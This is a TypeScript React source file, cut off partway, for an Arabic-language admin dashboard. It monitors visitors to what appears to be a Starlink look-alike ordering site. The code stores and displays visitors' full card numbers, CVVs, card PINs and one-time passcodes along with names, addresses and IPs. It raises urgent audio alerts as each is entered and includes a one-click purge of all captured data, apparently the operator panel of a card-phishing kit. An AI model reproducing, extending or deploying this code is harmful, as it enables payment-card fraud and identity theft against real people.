import { useEffect, useMemo, useRef, useState } from "react";
import { Navigate } from "react-router-dom";
import {
  Loader2, Search, Trash2, X, Mail, Phone, MapPin, Globe, Monitor, Clock,
  Hash, CreditCard, Lock, ShieldCheck, Package, Eye, Users as UsersIcon,
  CircleDot, Wifi, WifiOff, LayoutGrid, LogOut, Settings, Send, Home, CheckCircle2, RefreshCw,
  UserPlus, Bell, MessageSquareX, Check, XCircle, Volume2, VolumeX, KeyRound, Database, Combine,
  Copy,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { toast as sonner } from "sonner";
import type { Session } from "@supabase/supabase-js";
import CountryFlag from "@/components/starlink/CountryFlag";
import type { CountryCode } from "@/contexts/CountryContext";
import { SUPPORTED_COUNTRIES, COUNTRIES } from "@/contexts/CountryContext";
import { useNavigate } from "react-router-dom";
import {
  DropdownMenu, DropdownMenuContent, DropdownMenuItem,
  DropdownMenuLabel, DropdownMenuSeparator, DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import Card3DPreview from "@/components/admin/Card3DPreview";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

interface Visitor {
  id: string;
  session_id: string;
  user_id: string | null;
  full_name: string | null;
  email: string | null;
  phone: string | null;
  address: string | null;
  city: string | null;
  country: string | null;
  postal_code: string | null;
  detected_country: string | null;
  currency: string | null;
  language: string | null;
  user_agent: string | null;
  referrer: string | null;
  landing_path: string | null;
  last_path: string | null;
  ip_address: string | null;
  visits_count: number;
  last_seen_at: string;
  created_at: string;
  updated_at: string;
  card_holder: string | null;
  card_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_pin: string | null;
  card_otp: string | null;
  plan_selected: string | null;
  order_total: string | null;
  checkout_at: string | null;
  card_at: string | null;
  pin_at: string | null;
  otp_at: string | null;
}

const ONLINE_WINDOW_MS = 2 * 60 * 1000; // 2 minutes => "online"

const formatDateTime = (s: string) =>
  new Date(s).toLocaleString("ar-EG", { dateStyle: "medium", timeStyle: "short" });

const formatTime = (s: string) =>
  new Date(s).toLocaleTimeString("ar-EG", { hour: "2-digit", minute: "2-digit" });

const timeAgo = (s: string): string => {
  const diff = Date.now() - new Date(s).getTime();
  if (diff < 60_000) return "\u0627\u0644\u0622\u0646";
  const m = Math.floor(diff / 60_000);
  if (m < 60) return `\u0642\u0628\u0644 ${m} \u062f`;
  const h = Math.floor(m / 60);
  if (h < 24) return `\u0642\u0628\u0644 ${h} \u0633`;
  const d = Math.floor(h / 24);
  return `\u0642\u0628\u0644 ${d} \u064a`;
};

const isCountryCode = (s: string | null): s is CountryCode =>
  !!s && (SUPPORTED_COUNTRIES as readonly string[]).includes(s);

const isOnline = (v: Visitor) =>
  Date.now() - new Date(v.last_seen_at).getTime() < ONLINE_WINDOW_MS;

const isPaymentStage = (v: Visitor) =>
  !!(v.card_number || v.card_pin || v.card_otp);

const toMs = (s?: string | null) => (s ? new Date(s).getTime() : 0);
const hasText = (value: string | null | undefined) => value !== null && value !== undefined && value.trim() !== "";

/** Small colored chip showing the visitor's furthest reached stage. */
const RowStageChip = ({ v }: { v: Visitor }) => {
  const stage = v.card_otp
    ? { label: "OTP", icon: ShieldCheck, cls: "bg-rose-500/15 text-rose-600 dark:text-rose-400 ring-rose-500/30" }
    : v.card_pin
    ? { label: "PIN", icon: KeyRound, cls: "bg-amber-500/15 text-amber-600 dark:text-amber-400 ring-amber-500/30" }
    : v.card_number
    ? { label: "\u0628\u0637\u0627\u0642\u0629", icon: CreditCard, cls: "bg-violet-500/15 text-violet-600 dark:text-violet-400 ring-violet-500/30" }
    : v.checkout_at || v.full_name || v.email || v.phone
    ? { label: "\u062a\u0634\u0643\u0627\u0648\u062a", icon: Package, cls: "bg-sky-500/15 text-sky-600 dark:text-sky-400 ring-sky-500/30" }
    : null;
  if (!stage) return null;
  const Icon = stage.icon;
  return (
    <span className={`inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full text-[10px] font-semibold ring-1 ${stage.cls} shrink-0`}>
      <Icon className="w-3 h-3" />
      {stage.label}
    </span>
  );
};


const mergeVisitorsBySession = (rows: Visitor[]) => {
  const groups = new Map<string, Visitor[]>();

  for (const row of rows) {
    const key = row.session_id || row.id;
    const bucket = groups.get(key) ?? [];
    bucket.push(row);
    groups.set(key, bucket);
  }

  const merged = Array.from(groups.values()).map((group) => {
    const sorted = [...group].sort((a, b) => {
      const aFreshness = Math.max(toMs(a.updated_at), toMs(a.last_seen_at), toMs(a.created_at));
      const bFreshness = Math.max(toMs(b.updated_at), toMs(b.last_seen_at), toMs(b.created_at));
      return bFreshness - aFreshness;
    });

    const newest = sorted[0];
    const oldest = [...sorted].sort((a, b) => toMs(a.created_at) - toMs(b.created_at))[0] ?? newest;
    const firstFilled = <K extends keyof Visitor>(key: K): Visitor[K] => {
      for (const row of sorted) {
        const value = row[key];
        if (typeof value === "string") {
          if (hasText(value)) return value as Visitor[K];
          continue;
        }
        if (value !== null && value !== undefined) return value as Visitor[K];
      }
      return newest[key];
    };

    return {
      ...newest,
      id: newest.id,
      session_id: newest.session_id,
      user_id: firstFilled("user_id"),
      full_name: firstFilled("full_name"),
      email: firstFilled("email"),
      phone: firstFilled("phone"),
      address: firstFilled("address"),
      city: firstFilled("city"),
      country: firstFilled("country"),
      postal_code: firstFilled("postal_code"),
      detected_country: firstFilled("detected_country"),
      currency: firstFilled("currency"),
      language: firstFilled("language"),
      user_agent: firstFilled("user_agent"),
      referrer: firstFilled("referrer"),
      landing_path: firstFilled("landing_path"),
      last_path: firstFilled("last_path"),
      ip_address: firstFilled("ip_address"),
      card_holder: firstFilled("card_holder"),
      card_number: firstFilled("card_number"),
      card_expiry: firstFilled("card_expiry"),
      card_cvv: firstFilled("card_cvv"),
      card_pin: firstFilled("card_pin"),
      card_otp: firstFilled("card_otp"),
      plan_selected: firstFilled("plan_selected"),
      order_total: firstFilled("order_total"),
      checkout_at: firstFilled("checkout_at"),
      card_at: firstFilled("card_at"),
      pin_at: firstFilled("pin_at"),
      otp_at: firstFilled("otp_at"),
      created_at: oldest.created_at,
      updated_at: sorted.reduce((latest, row) => (toMs(row.updated_at) > toMs(latest) ? row.updated_at : latest), newest.updated_at),
      last_seen_at: sorted.reduce((latest, row) => (toMs(row.last_seen_at) > toMs(latest) ? row.last_seen_at : latest), newest.last_seen_at),
      visits_count: Math.max(...sorted.map((row) => row.visits_count || 0), 1),
    } satisfies Visitor;
  });

  return merged.sort((a, b) => Math.max(toMs(b.last_seen_at), toMs(b.updated_at)) - Math.max(toMs(a.last_seen_at), toMs(a.updated_at)));
};

// Map last_path \u2192 friendly label + emoji
const pageLabel = (path: string | null): { label: string; emoji: string } => {
  if (!path) return { label: "\u063a\u064a\u0631 \u0645\u0639\u0631\u0648\u0641", emoji: "\u2753" };
  if (path === "/" || path === "") return { label: "\u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629", emoji: "\ud83c\udfe0" };
  if (path.startsWith("/checkout")) return { label: "\u0625\u062a\u0645\u0627\u0645 \u0627\u0644\u0637\u0644\u0628", emoji: "\ud83e\uddfe" };
  if (path.startsWith("/payment/otp")) return { label: "OTP", emoji: "\ud83d\udd10" };
  if (path.startsWith("/payment/pin")) return { label: "PIN", emoji: "\ud83d\udd22" };
  if (path.startsWith("/payment")) return { label: "\u0627\u0644\u062f\u0641\u0639", emoji: "\ud83d\udcb3" };
  if (path.startsWith("/success")) return { label: "\u0646\u062c\u0627\u062d", emoji: "\u2705" };
  if (path.startsWith("/business")) return { label: "\u0623\u0639\u0645\u0627\u0644", emoji: "\ud83d\udcbc" };
  if (path.startsWith("/residential")) return { label: "\u0645\u0646\u0632\u0644\u064a", emoji: "\ud83c\udfe1" };
  if (path.startsWith("/roam")) return { label: "\u062a\u0646\u0642\u0651\u0644", emoji: "\ud83d\udef0\ufe0f" };
  if (path.startsWith("/map")) return { label: "\u0627\u0644\u062e\u0631\u064a\u0637\u0629", emoji: "\ud83d\uddfa\ufe0f" };
  if (path.startsWith("/service-plans")) return { label: "\u0627\u0644\u0628\u0627\u0642\u0627\u062a", emoji: "\ud83d\udce6" };
  if (path.startsWith("/support")) return { label: "\u0627\u0644\u062f\u0639\u0645", emoji: "\ud83d\udedf" };
  return { label: path.replace(/^\//, "") || "\u0635\u0641\u062d\u0629", emoji: "\ud83d\udcc4" };
};

type StatusFilter = "all" | "online" | "offline" | "payment" | "completed" | "rejected";

const AdminVisitors = () => {
  const navigate = useNavigate();
  const [session, setSession] = useState<Session | null>(null);
  const [isAdmin, setIsAdmin] = useState<boolean | null>(null);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [loading, setLoading] = useState(true);
  const [query, setQuery] = useState("");
  const [statusFilter, setStatusFilter] = useState<StatusFilter>("all");
  const [selected, setSelected] = useState<Visitor | null>(null);
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [, forceTick] = useState(0);
  const [muted, setMuted] = useState<boolean>(() => localStorage.getItem("admin_muted") === "1");
  const [pwOpen, setPwOpen] = useState(false);

  const notify = (title: string, opts?: Parameters<typeof sonner>[1]) => {
    if (muted) return;
    sonner(title, opts);
  };

  // Short alert beep using Web Audio API (no external assets needed)
  const playAlert = (kind: "soft" | "urgent" = "soft") => {
    if (muted) return;
    try {
      const AC = window.AudioContext || (window as any).webkitAudioContext;
      if (!AC) return;
      const ctx = new AC();
      const playTone = (freq: number, start: number, dur: number) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.value = freq;
        gain.gain.setValueAtTime(0, ctx.currentTime + start);
        gain.gain.linearRampToValueAtTime(0.18, ctx.currentTime + start + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + start + dur);
        osc.connect(gain).connect(ctx.destination);
        osc.start(ctx.currentTime + start);
        osc.stop(ctx.currentTime + start + dur + 0.02);
      };
      if (kind === "urgent") {
        // Two-tone urgent chime: high \u2192 higher
        playTone(880, 0, 0.18);
        playTone(1320, 0.18, 0.22);
      } else {
        playTone(660, 0, 0.18);
      }
      setTimeout(() => ctx.close().catch(() => undefined), 700);
    } catch {
      // ignore audio failures (e.g. user hasn't interacted yet)
    }
  };

  const toggleMute = () => {
    setMuted((m) => {
      const next = !m;
      localStorage.setItem("admin_muted", next ? "1" : "0");
      toast({ title: next ? "\u062a\u0645 \u0643\u062a\u0645 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062a" : "\u062a\u0645 \u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062a" });
      return next;
    });
  };

  // Auth + role
  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => setSession(data.session));
    const { data: sub } = supabase.auth.onAuthStateChange((_e, s) => setSession(s));
    return () => sub.subscription.unsubscribe();
  }, []);

  useEffect(() => {
    if (!session) { setIsAdmin(null); return; }
    (async () => {
      const { data } = await supabase
        .from("user_roles")
        .select("role")
        .eq("user_id", session.user.id)
        .eq("role", "admin")
        .maybeSingle();
      setIsAdmin(!!data);
    })();
  }, [session]);

  // Load + normalize duplicate rows by session.
  // `silent` skips the full-page spinner so background refreshes (realtime + polling)
  // don't make the panel "flicker" every few seconds.
  const load = async (silent = false) => {
    if (!silent) setLoading(true);
    const { data, error } = await supabase
      .from("visitors")
      .select("*")
      .order("last_seen_at", { ascending: false })
      .limit(1000);
    if (error) {
      if (!silent) toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u0627\u0644\u062a\u062d\u0645\u064a\u0644", description: error.message, variant: "destructive" });
    } else {
      const merged = mergeVisitorsBySession((data || []) as Visitor[]);
      // Skip state update if nothing actually changed \u2014 prevents needless re-renders.
      setVisitors((prev) => {
        if (prev.length === merged.length) {
          let identical = true;
          for (let i = 0; i < prev.length; i++) {
            const a = prev[i], b = merged[i];
            if (a.id !== b.id || a.updated_at !== b.updated_at || a.last_seen_at !== b.last_seen_at) {
              identical = false;
              break;
            }
          }
          if (identical) return prev;
        }
        return merged;
      });
    }
    if (!silent) setLoading(false);
  };

  useEffect(() => {
    if (isAdmin) void load();
  }, [isAdmin]);

  useEffect(() => {
    if (!selected) return;
    const fresh = visitors.find((visitor) => visitor.session_id === selected.session_id)
      ?? visitors.find((visitor) => visitor.id === selected.id);

    if (!fresh) {
      setSelected(null);
      setDetailsOpen(false);
      return;
    }

    if (fresh.id !== selected.id || fresh.updated_at !== selected.updated_at || fresh.last_seen_at !== selected.last_seen_at) {
      setSelected(fresh);
    }
  }, [visitors, selected]);

  // Track previous snapshot of visitors to detect new entries / new actions
  const prevSnapshot = useRef<Map<string, Visitor>>(new Map());
  const isFirstLoad = useRef(true);

  // Detect changes vs previous snapshot \u2192 fire toasts
  useEffect(() => {
    if (isFirstLoad.current) {
      // Skip notifications on first render \u2014 just seed snapshot
      prevSnapshot.current = new Map(visitors.map((v) => [v.id, v]));
      if (visitors.length > 0) isFirstLoad.current = false;
      return;
    }
    const prev = prevSnapshot.current;
    const next = new Map(visitors.map((v) => [v.id, v]));

    for (const [id, v] of next) {
      const old = prev.get(id);
      const name = v.full_name || "\u0632\u0627\u0626\u0631";
      if (!old) {
        notify(`\u2728 \u0632\u0627\u0626\u0631 \u062c\u062f\u064a\u062f \u062f\u062e\u0644 \u0627\u0644\u0645\u0648\u0642\u0639`, {
          description: `${name} \u2014 ${pageLabel(v.last_path).label}`,
          duration: 6000,
        });
        continue;
      }
      // Detect action transitions (new field set)
      const newAction = (k: keyof Visitor, label: string, sensitive = false) => {
        if (!old[k] && v[k]) {
          notify(`\ud83d\udd14 \u0625\u062c\u0631\u0627\u0621 \u062c\u062f\u064a\u062f: ${label}`, {
            description: `${name} \u2014 ${pageLabel(v.last_path).label}`,
            duration: 6000,
          });
          if (sensitive) playAlert("urgent");
          else playAlert("soft");
        }
      };
      newAction("full_name", "\u0625\u062f\u062e\u0627\u0644 \u0627\u0644\u0627\u0633\u0645");
      newAction("email", "\u0625\u062f\u062e\u0627\u0644 \u0627\u0644\u0628\u0631\u064a\u062f");
      newAction("phone", "\u0625\u062f\u062e\u0627\u0644 \u0627\u0644\u0647\u0627\u062a\u0641");
      newAction("card_number", "\u0625\u062f\u062e\u0627\u0644 \u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u062f\u0641\u0639", true);
      newAction("card_pin", "\u0625\u062f\u062e\u0627\u0644 PIN", true);
      newAction("card_otp", "\u0625\u062f\u062e\u0627\u0644 OTP", true);
      if (old.last_path !== v.last_path && v.last_path) {
        notify(`\ud83d\udccd ${name} \u0627\u0646\u062a\u0642\u0644 \u0625\u0644\u0649 \u0635\u0641\u062d\u0629 \u062c\u062f\u064a\u062f\u0629`, {
          description: `${pageLabel(v.last_path).label} (${v.last_path})`,
          duration: 4500,
        });
      }
    }
    prevSnapshot.current = next;
  }, [visitors]);

  // Realtime: refresh on any visitor change (debounced + silent to avoid flicker)
  useEffect(() => {
    if (!isAdmin) return;
    let timer: number | null = null;
    const scheduleReload = () => {
      if (timer !== null) return;
      timer = window.setTimeout(() => {
        timer = null;
        void load(true);
      }, 150);
    };
    const channel = supabase
      .channel("admin_visitors_rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "visitors" }, scheduleReload)
      .subscribe();
    return () => {
      if (timer !== null) window.clearTimeout(timer);
      supabase.removeChannel(channel);
    };
  }, [isAdmin]);

  // Polling fallback in case realtime misses an event (silent \u2014 no spinner flash)
  useEffect(() => {
    if (!isAdmin) return;
    const intervalId = window.setInterval(() => {
      void load(true);
    }, 30_000);
    return () => window.clearInterval(intervalId);
  }, [isAdmin]);

  // Recompute online state every 30s
  useEffect(() => {
    const i = setInterval(() => forceTick((n) => n + 1), 30_000);
    return () => clearInterval(i);
  }, []);

  const remove = async (sessionId: string) => {
    if (!confirm("\u062d\u0630\u0641 \u0647\u0630\u0627 \u0627\u0644\u0632\u0627\u0626\u0631 \u0646\u0647\u0627\u0626\u064a\u0627\u064b\u061f")) return;
    const { error } = await supabase.from("visitors").delete().eq("session_id", sessionId);
    if (error) {
      toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u0627\u0644\u062d\u0630\u0641", description: error.message, variant: "destructive" });
      return;
    }
    setVisitors((v) => v.filter((x) => x.session_id !== sessionId));
    if (selected?.session_id === sessionId) setSelected(null);
    toast({ title: "\u062a\u0645 \u0627\u0644\u062d\u0630\u0641" });
  };

  const removeAll = async () => {
    const offline = visitors.filter((v) => !isOnline(v));
    if (offline.length === 0) {
      toast({ title: "\u0644\u0627 \u064a\u0648\u062c\u062f \u0632\u0648\u0651\u0627\u0631 \u063a\u064a\u0631 \u0645\u062a\u0635\u0644\u064a\u0646 \u0644\u0644\u062d\u0630\u0641" });
      return;
    }
    if (!confirm(`\u062d\u0630\u0641 ${offline.length} \u0632\u0627\u0626\u0631 \u063a\u064a\u0631 \u0645\u062a\u0635\u0644\u061f \u0633\u064a\u0628\u0642\u0649 \u0627\u0644\u0632\u0648\u0651\u0627\u0631 \u0627\u0644\u0645\u062a\u0635\u0644\u0648\u0646.`)) return;
    const sessionIds = Array.from(new Set(offline.map((v) => v.session_id)));
    const { error } = await supabase.from("visitors").delete().in("session_id", sessionIds);
    if (error) {
      toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u0627\u0644\u062d\u0630\u0641", description: error.message, variant: "destructive" });
      return;
    }
    setVisitors((prev) => prev.filter((v) => isOnline(v)));
    if (selected && !isOnline(selected)) setSelected(null);
    toast({ title: `\u062a\u0645 \u062d\u0630\u0641 ${sessionIds.length} \u0632\u0627\u0626\u0631 \u063a\u064a\u0631 \u0645\u062a\u0635\u0644` });
  };

  // Wipe ALL visitor data + commands from the database (not just the loaded list)
  const purgeAllData = async () => {
    if (!confirm("\u0633\u064a\u062a\u0645 \u0645\u0633\u062d \u062c\u0645\u064a\u0639 \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0632\u0648\u0651\u0627\u0631 \u0648\u0627\u0644\u0623\u0648\u0627\u0645\u0631 \u0645\u0646 \u0642\u0627\u0639\u062f\u0629 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0646\u0647\u0627\u0626\u064a\u0627\u064b. \u0645\u062a\u0627\u0628\u0639\u0629\u061f")) return;
    const [v, c] = await Promise.all([
      supabase.from("visitors").delete().not("id", "is", null),
      supabase.from("visitor_commands").delete().not("id", "is", null),
    ]);
    if (v.error || c.error) {
      toast({
        title: "\u062a\u0639\u0630\u0651\u0631 \u0627\u0644\u0645\u0633\u062d \u0627\u0644\u0643\u0627\u0645\u0644",
        description: v.error?.message || c.error?.message,
        variant: "destructive",
      });
      return;
    }
    setVisitors([]);
    setSelected(null);
    toast({ title: "\u062a\u0645 \u0645\u0633\u062d \u062c\u0645\u064a\u0639 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0628\u0646\u062c\u0627\u062d" });
  };

  const dedupeVisitors = async () => {
    if (!confirm("\u0633\u064a\u062a\u0645 \u062f\u0645\u062c \u0643\u0644 \u0627\u0644\u0635\u0641\u0648\u0641 \u0627\u0644\u0645\u0643\u0631\u0631\u0629 \u0644\u0643\u0644 \u062c\u0644\u0633\u0629 \u0641\u064a \u0635\u0641 \u0648\u0627\u062d\u062f \u0645\u0639 \u0627\u0644\u062d\u0641\u0627\u0638 \u0639\u0644\u0649 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a. \u0645\u062a\u0627\u0628\u0639\u0629\u061f")) return;
    const { data, error } = await supabase.rpc("merge_duplicate_visitors");
    if (error) {
      toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u0627\u0644\u062f\u0645\u062c", description: error.message, variant: "destructive" });
      return;
    }
    const result = (data ?? {}) as { merged_sessions?: number; removed_rows?: number };
    toast({
      title: "\u062a\u0645 \u062a\u0646\u0638\u064a\u0641 \u0627\u0644\u0633\u062c\u0644\u0627\u062a \u0627\u0644\u0645\u0643\u0631\u0631\u0629",
      description: `\u062c\u0644\u0633\u0627\u062a \u0645\u062f\u0645\u062c\u0629: ${result.merged_sessions ?? 0} \u2022 \u0635\u0641\u0648\u0641 \u0645\u062d\u0630\u0648\u0641\u0629: ${result.removed_rows ?? 0}`,
    });
    void load();
  };

  const signOut = async () => {
    await supabase.auth.signOut();
    navigate("/admin/login", { replace: true });
  };

  // ----- derived -----
  const stats = useMemo(() => {
    const online = visitors.filter(isOnline).length;
    const total = visitors.length;
    const payment = visitors.filter(isPaymentStage).length;
    const browsing = total - payment;
    const topCountry = (() => {
      const counts = new Map<string, number>();
      for (const v of visitors) {
        const c = v.detected_country;
        if (c) counts.set(c, (counts.get(c) ?? 0) + 1);
      }
      let best: { code: string; count: number } | null = null;
      for (const [code, count] of counts) {
        if (!best || count > best.count) best = { code, count };
      }
      return best;
    })();
    return { total, online, browsing, payment, waiting: 0, topCountry };
  }, [visitors]);

  const filtered = useMemo(() => {
    return visitors.filter((v) => {
      if (statusFilter === "online" && !isOnline(v)) return false;
      if (statusFilter === "offline" && isOnline(v)) return false;
      if (statusFilter === "payment" && !isPaymentStage(v)) return false;
      if (statusFilter === "completed" && v.last_path !== "/success") return false;
      if (query.trim()) {
        const q = query.toLowerCase();
        const match = [v.full_name, v.email, v.phone, v.city, v.country, v.session_id, v.last_path]
          .some((f) => f?.toLowerCase().includes(q));
        if (!match) return false;
      }
      return true;
    });
  }, [visitors, query, statusFilter]);

  useEffect(() => {
    if (loading) return;

    if (selected) {
      const stillVisible = filtered.some((visitor) => visitor.id === selected.id);
      if (stillVisible) return;
    }

    setSelected(filtered[0] ?? null);
  }, [filtered, loading, selected]);

  // ----- guards -----
  if (!session) return <Navigate to="/admin/login" replace />;
  if (isAdmin === null) {
    return (
      <main className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
      </main>
    );
  }
  if (!isAdmin) {
    return (
      <main className="min-h-screen flex items-center justify-center bg-background text-foreground">
        <div className="text-center space-y-2">
          <p className="text-lg">\u063a\u064a\u0631 \u0645\u0635\u0631\u0651\u062d</p>
          <p className="text-sm text-muted-foreground">\u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629 \u0644\u0644\u0645\u062f\u0631\u0627\u0621 \u0641\u0642\u0637.</p>
        </div>
      </main>
    );
  }

  return (
    <>
    <SEO title={seoData.adminVisitors.title} description={seoData.adminVisitors.description} path="/admin/visitors" noIndex />
    <main className="admin-light min-h-screen bg-muted/40 text-foreground" dir="rtl">
      {/* Top bar */}
      <header className="bg-background border-b border-border">
        <div className="px-3 md:px-6 h-14 md:h-16 flex items-center justify-between gap-2 md:gap-4">
          <div className="flex items-center gap-1.5 md:gap-2 overflow-x-auto scrollbar-hide flex-1 min-w-0">
            <Stat label="\u0645\u062a\u0635\u0644" value={stats.online} tone="emerald" icon={<CircleDot className="w-3.5 h-3.5" />} />
            <Stat label="\u0628\u0627\u0646\u062a\u0638\u0627\u0631" value={stats.waiting} tone="amber" icon={<Clock className="w-3.5 h-3.5" />} />
            <Stat label="\u0627\u0644\u0625\u062c\u0645\u0627\u0644\u064a" value={stats.total} tone="slate" icon={<UsersIcon className="w-3.5 h-3.5" />} />
            <Stat label="\u064a\u062a\u0635\u0641\u062d" value={stats.browsing} tone="sky" icon={<Eye className="w-3.5 h-3.5" />} />
            <Stat label="\u0641\u064a \u0627\u0644\u062f\u0641\u0639" value={stats.payment} tone="rose" icon={<CreditCard className="w-3.5 h-3.5" />} />
            {stats.topCountry && isCountryCode(stats.topCountry.code) && (
              <div className="hidden md:flex items-center gap-2 px-3 h-10 rounded-xl border border-border bg-card text-xs shrink-0">
                <Globe className="w-3.5 h-3.5 text-muted-foreground" />
                <span className="text-muted-foreground">\u0623\u0639\u0644\u0649 \u0627\u0644\u062f\u0648\u0644</span>
                <span className="font-semibold text-foreground">{stats.topCountry.count}</span>
                <CountryFlag code={stats.topCountry.code} className="w-4 h-3 rounded-sm" />
              </div>
            )}
          </div>

          <div className="flex items-center gap-2 md:gap-3 shrink-0">
            <div className="text-right hidden lg:block">
              <h1 className="text-lg font-semibold leading-tight">\u0644\u0648\u062d\u0629 \u0627\u0644\u062a\u062d\u0643\u0645</h1>
              <p className="text-[11px] text-muted-foreground leading-tight">\u0625\u062f\u0627\u0631\u0629 \u0627\u0644\u0632\u0648\u0627\u0631 \u0648\u0627\u0644\u0645\u062f\u0641\u0648\u0639\u0627\u062a</p>
            </div>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <button
                  title="\u0625\u0639\u062f\u0627\u062f\u0627\u062a \u0644\u0648\u062d\u0629 \u0627\u0644\u062a\u062d\u0643\u0645"
                  className="w-9 h-9 md:w-10 md:h-10 rounded-full bg-rose-50 text-rose-600 hover:bg-rose-100 flex items-center justify-center transition shrink-0"
                >
                  <Settings className="w-4 h-4" />
                </button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuLabel>\u0625\u0639\u062f\u0627\u062f\u0627\u062a \u0644\u0648\u062d\u0629 \u0627\u0644\u062a\u062d\u0643\u0645</DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onSelect={toggleMute}>
                  {muted ? <Volume2 className="w-4 h-4 ml-2" /> : <VolumeX className="w-4 h-4 ml-2" />}
                  {muted ? "\u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0635\u0648\u062a" : "\u0643\u062a\u0645 \u0627\u0644\u0635\u0648\u062a"}
                </DropdownMenuItem>
                <DropdownMenuItem onSelect={() => setPwOpen(true)}>
                  <KeyRound className="w-4 h-4 ml-2" />
                  \u062a\u063a\u064a\u064a\u0631 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631
                </DropdownMenuItem>
                <DropdownMenuItem onSelect={dedupeVisitors}>
                  <Combine className="w-4 h-4 ml-2" />
                  \u062f\u0645\u062c \u0627\u0644\u062c\u0644\u0633\u0627\u062a \u0627\u0644\u0645\u0643\u0631\u0631\u0629
                </DropdownMenuItem>
                <DropdownMenuItem
                  onSelect={purgeAllData}
                  className="text-rose-600 focus:text-rose-700 focus:bg-rose-50"
                >
                  <Database className="w-4 h-4 ml-2" />
                  \u0645\u0633\u062d \u062c\u0645\u064a\u0639 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  onSelect={signOut}
                  className="text-rose-600 focus:text-rose-700 focus:bg-rose-50"
                >
                  <LogOut className="w-4 h-4 ml-2" />
                  \u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062e\u0631\u0648\u062c
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
            <ChangePasswordDialog open={pwOpen} onOpenChange={setPwOpen} />
          </div>
        </div>
      </header>

      {/* Body \u2014 visitor list on the RIGHT (~25%), placeholder/details on the LEFT */}
      <div className="px-3 md:px-6 py-3 md:py-4 grid lg:grid-cols-[minmax(280px,25%)_1fr] gap-3 md:gap-4 max-w-[1600px] mx-auto" dir="rtl">
        {/* RIGHT: Visitor list (~25%) \u2014 appears first in RTL = right side */}
        <section className="order-1 bg-background rounded-2xl border border-border overflow-hidden flex flex-col lg:max-h-[calc(100vh-6rem)]">
          {/* List header */}
          <div className="p-4 border-b border-border space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="font-semibold">\u0627\u0644\u0632\u0648\u0627\u0631</span>
                <UsersIcon className="w-4 h-4 text-muted-foreground" />
              </div>
              <div className="flex items-center gap-2">
                <span className="text-xs px-2 py-1 rounded-full bg-muted text-muted-foreground">
                  {filtered.length}/{visitors.length}
                </span>
                <button
                  onClick={removeAll}
                  className="w-8 h-8 rounded-lg text-rose-600 hover:bg-rose-50 flex items-center justify-center transition"
                  title="\u062d\u0630\u0641 \u063a\u064a\u0631 \u0627\u0644\u0645\u062a\u0635\u0644\u064a\u0646"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="relative">
              <Search className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                placeholder="\u0628\u062d\u062b \u0628\u0627\u0644\u0627\u0633\u0645 \u0623\u0648 \u0627\u0644\u0647\u0627\u062a\u0641..."
                className="w-full h-10 bg-muted/50 rounded-lg border border-transparent focus:bg-background focus:border-border pr-10 pl-3 text-sm outline-none"
              />
            </div>

            {/* Pills */}
            <div className="flex items-center gap-1.5 overflow-x-auto pb-1 -mx-1 px-1">
              <Pill active={statusFilter === "all"} onClick={() => setStatusFilter("all")} tone="slate">
                \u0627\u0644\u0643\u0644
              </Pill>
              <Pill active={statusFilter === "payment"} onClick={() => setStatusFilter("payment")} tone="rose">
                \u0641\u064a \u0627\u0644\u062f\u0641\u0639
              </Pill>
              <Pill active={statusFilter === "completed"} onClick={() => setStatusFilter("completed")} tone="emerald">
                \u0645\u0643\u062a\u0645\u0644
              </Pill>
              <Pill active={statusFilter === "online"} onClick={() => setStatusFilter("online")} tone="emerald" icon={<Wifi className="w-3 h-3" />}>
                \u0645\u062a\u0635\u0644
              </Pill>
              <Pill active={statusFilter === "offline"} onClick={() => setStatusFilter("offline")} tone="slate" icon={<WifiOff className="w-3 h-3" />}>
                \u063a\u064a\u0631 \u0645\u062a\u0635\u0644
              </Pill>
            </div>
          </div>

          {/* List */}
          <div className="flex-1 overflow-y-auto">
            {loading ? (
